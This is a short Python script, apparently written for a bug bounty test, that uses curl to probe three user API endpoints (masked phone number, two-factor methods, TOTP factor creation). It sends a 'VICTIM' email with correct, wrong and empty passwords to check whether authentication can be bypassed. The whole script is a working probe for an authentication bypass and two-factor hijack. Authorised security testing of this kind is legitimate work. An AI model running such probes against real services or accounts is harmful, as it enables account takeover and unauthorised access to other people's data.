import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
VICTIM="golden-leaf-3068@bugcrowdninja.com"
def req(path,body):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
cases=[("correct","Tester"),("wrong","DefinitelyWrong999!"),("empty","")]
for ep in ['get-masked-phone-number','two-factor-methods','create-totp-factor']:
    print(f"########## {ep}")
    for label,pw in cases:
        c,b=req(f'/api/v1/users/{ep}',{"credentials":{"email":VICTIM,"password":pw}})
        print(f"  pw={label:8} -> {c}  {b[:230].replace(chr(10),' ')}")
    print()
